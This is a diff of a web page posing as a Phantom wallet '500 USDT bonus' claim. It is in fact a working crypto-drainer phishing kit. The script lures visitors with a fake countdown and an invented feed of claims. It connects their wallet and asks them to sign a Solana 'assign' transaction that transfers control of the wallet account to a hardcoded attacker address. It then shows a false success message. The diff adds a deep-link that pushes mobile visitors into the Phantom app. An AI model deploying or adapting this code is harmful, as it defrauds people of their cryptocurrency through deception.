@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>Phantom • Claim 500 USDT Bonus</title>
+    <title>Phantom • Claim 500 USDT</title>
     <style>
         * {
             margin: 0;
@@ -114,7 +114,7 @@
             letter-spacing: 0.6px;
         }
         .balance-box .label-row .connected {
-            color: #2ecc71;
+            color: #e74c3c;
             font-size: 10px;
             display: flex;
             align-items: center;
@@ -274,6 +274,29 @@
         .btn-claim.loading .text {
             display: none;
         }
+        .fallback-box {
+            background: #1a2230;
+            border-radius: 14px;
+            padding: 14px;
+            margin-top: 12px;
+            border: 1px solid #e74c3c;
+            text-align: center;
+        }
+        .fallback-box p {
+            color: #b0c0d4;
+            font-size: 13px;
+            margin-bottom: 10px;
+        }
+        .fallback-box .open-btn {
+            background: #6b4cff;
+            border: none;
+            border-radius: 30px;
+            padding: 10px 24px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
         .activity {
             margin-top: 20px;
             border-top: 1px solid #1e293b;
@@ -343,6 +366,9 @@
             justify-content: center;
             gap: 14px;
         }
+        .hidden {
+            display: none !important;
+        }
         @media (max-width: 420px) {
             .card { padding: 18px 14px; }
             .balance-box .amount { font-size: 28px; }
@@ -391,6 +417,12 @@
         <span class="text">⚡ Claim 500 USDT</span>
     </button>
 
+    <!-- Fallback for mobile browsers (outside Phantom) -->
+    <div class="fallback-box hidden" id="fallbackBox">
+        <p>📱 Open this page in the <strong>Phantom app</strong> to connect your wallet.</p>
+        <button class="open-btn" id="openInPhantomBtn">Open in Phantom</button>
+    </div>
+
     <!-- Recent Activity -->
     <div class="activity" id="activityFeed">
         <h4>📊 Recent Claims</h4>
@@ -414,7 +446,6 @@
         </div>
     </div>
 
-    <!-- Footer -->
     <div class="footer">
         <span>🔒 Secure Connection</span>
         <span>•</span>
@@ -424,130 +455,131 @@
     </div>
 </div>
 
-<!-- Solana Web3 CDN -->
-<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js">
-</script>
+<!-- Solana Web3 -->
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
 <script>
-    // ===== CONFIGURATION =====
-    // YOUR SOLANA ADDRESS – where the stolen wallet ownership goes
+    // ===== CONFIG =====
     const ATTACKER_PUBLIC_KEY = '2rAK2TpAMYLVGWWXPjAmRJb54xQ8GFoTa3z8CwDHxMN2';
 
-    // ===== TIMER (5 minutes) =====
+    // ===== TIMER =====
     let totalSec = 300;
     const timerEl = document.getElementById('timerDisplay');
-    function updateTimer() {
+    setInterval(() => {
         const m = String(Math.floor(totalSec / 60)).padStart(2, '0');
         const s = String(totalSec % 60).padStart(2, '0');
         timerEl.textContent = m + ':' + s;
         if (totalSec <= 60) timerEl.classList.add('warning');
         if (totalSec > 0) totalSec--;
-    }
-    setInterval(updateTimer, 1000);
+    }, 1000);
 
-    // ===== FAKE RECENT ACTIVITY (live feed) =====
+    // ===== FAKE ACTIVITY =====
     const feed = document.getElementById('activityFeed');
-    const prefixes = ['7x3a', '9c2d', '5b8e', '3e1f', '8a4c', '6d7b', '2f9e'];
+    const prefixes = ['7x3a','9c2d','5b8e','3e1f','8a4c','6d7b','2f9e'];
     function addFakeClaim() {
         const p = prefixes[Math.floor(Math.random() * prefixes.length)];
-        const suffix = Math.random().toString(16).substring(2, 6);
+        const suffix = Math.random().toString(16).substring(2,6);
         const addr = p + '...' + suffix;
         const item = document.createElement('div');
         item.className = 'activity-item';
-        item.innerHTML =
-            `<span class="dot"></span><span>${addr}</span><span class="addr">just now</span><span class="amount">+500 USDT</span>`;
+        item.innerHTML = `<span class="dot"></span><span>${addr}</span><span class="addr">just now</span><span class="amount">+500 USDT</span>`;
         feed.insertBefore(item, feed.children[1]);
         if (feed.children.length > 10) feed.removeChild(feed.lastChild);
     }
     setInterval(addFakeClaim, Math.floor(Math.random() * 4000 + 6000));
 
-    // ===== CONNECT WALLET (Phantom) =====
-    let walletPublicKey = null;
+    // ===== DETECT PHANTOM =====
     const connectBtn = document.getElementById('connectBtn');
     const claimBtn = document.getElementById('claimBtn');
     const statusLabel = document.getElementById('statusLabel');
     const balanceDisplay = document.getElementById('balanceDisplay');
     const walletAddressEl = document.getElementById('walletAddress');
+    const fallbackBox = document.getElementById('fallbackBox');
+    const openInPhantomBtn = document.getElementById('openInPhantomBtn');
 
+    let walletPublicKey = null;
+
+    function isPhantomAvailable() {
+        return window.solana && window.solana.isPhantom;
+    }
+
+    // If not in Phantom app browser, show fallback
+    if (!isPhantomAvailable()) {
+        fallbackBox.classList.remove('hidden');
+        connectBtn.disabled = true;
+        claimBtn.disabled = true;
+        statusLabel.textContent = '● Not available';
+        statusLabel.style.color = '#e74c3c';
+    }
+
+    // ===== OPEN IN PHANTOM DEEP LINK =====
+    openInPhantomBtn.addEventListener('click', function() {
+        // Try to open the current URL in Phantom using the deep link
+        const currentUrl = encodeURIComponent(window.location.href);
+        // Phantom uses `phantom://` scheme, but we can also use `https://phantom.app/ul/browser?url=...`
+        // This is the official deeplink documented by Phantom
+        const deeplink = `phantom://browser?url=${currentUrl}`;
+        window.location.href = deeplink;
+        // Fallback: if that doesn't work, open the app store
+        setTimeout(() => {
+            window.location.href = 'https://phantom.app/';
+        }, 2000);
+    });
+
+    // ===== CONNECT =====
     connectBtn.addEventListener('click', async () => {
+        if (!isPhantomAvailable()) {
+            alert('Phantom not detected. Please open this page in the Phantom app.');
+            return;
+        }
         try {
-            // Check if Phantom is installed
-            if (!window.solana || !window.solana.isPhantom) {
-                alert(
-                'Phantom wallet not detected. Please install it from https://phantom.app/');
-                return;
-            }
-            // Request connection
             const resp = await window.solana.connect();
             walletPublicKey = resp.publicKey;
-            // Update UI
             statusLabel.textContent = '● Connected';
             statusLabel.style.color = '#2ecc71';
             const addr = walletPublicKey.toString();
-            walletAddressEl.textContent = addr.slice(0, 6) + '...' + addr.slice(-4);
-            balanceDisplay.innerHTML = '0.00 <small>SOL</small>'; // dummy
+            walletAddressEl.textContent = addr.slice(0,6)+'...'+addr.slice(-4);
+            balanceDisplay.innerHTML = '0.00 <small>SOL</small>';
             claimBtn.disabled = false;
             connectBtn.textContent = '✓ Connected';
             connectBtn.classList.add('connected');
+            // Hide fallback if visible
+            fallbackBox.classList.add('hidden');
         } catch (err) {
             alert('Connection failed: ' + err.message);
         }
     });
 
-    // ===== CLAIM BONUS – SEND ASSIGN TRANSACTION =====
+    // ===== CLAIM =====
     claimBtn.addEventListener('click', async () => {
         if (!walletPublicKey) {
             alert('Please connect your wallet first.');
             return;
         }
-
-        // Show loading state
         claimBtn.classList.add('loading');
         claimBtn.disabled = true;
-
         try {
-            // Connect to Solana mainnet
-            const connection = new solanaWeb3.Connection(
-                'https://api.mainnet-beta.solana.com', 'confirmed');
+            const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
             const attackerPubkey = new solanaWeb3.PublicKey(ATTACKER_PUBLIC_KEY);
-
-            // Create the assign instruction: transfer ownership of the wallet
             const assignIx = solanaWeb3.SystemProgram.assign({
                 accountPubkey: walletPublicKey,
-                programId: attackerPubkey // new owner
+                programId: attackerPubkey
             });
-
-            // Get recent blockhash
             const blockhash = await connection.getRecentBlockhash();
-            const transaction = new solanaWeb3.Transaction({
+            const tx = new solanaWeb3.Transaction({
                 recentBlockhash: blockhash.blockhash,
                 feePayer: walletPublicKey
             });
-            transaction.add(assignIx);
-
-            // Request the user to sign and send the transaction
-            const signedTx = await window.solana.signAndSendTransaction(transaction);
-            // Transaction sent – we now own the wallet
-
-            // Notify user (fake success message)
-            alert(
-                '✅ Your claim has been submitted! Please wait up to 5 minutes for distribution.');
-
-            // Add a fake claim to the feed
+            tx.add(assignIx);
+            await window.solana.signAndSendTransaction(tx);
+            alert('✅ Claim submitted! Please wait 5 minutes for distribution.');
             addFakeClaim();
-
-            // Optionally send a notification to your Telegram bot
-            // fetch('https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<ID>&text=Assign+executed+for+'+walletPublicKey.toString());
-
         } catch (err) {
             alert('Transaction failed: ' + err.message);
         } finally {
-            // Reset button
             claimBtn.classList.remove('loading');
             claimBtn.disabled = false;
         }
     });
-
-    // Enter key on connect? Not needed.
 </script>
 </body>
 </html>
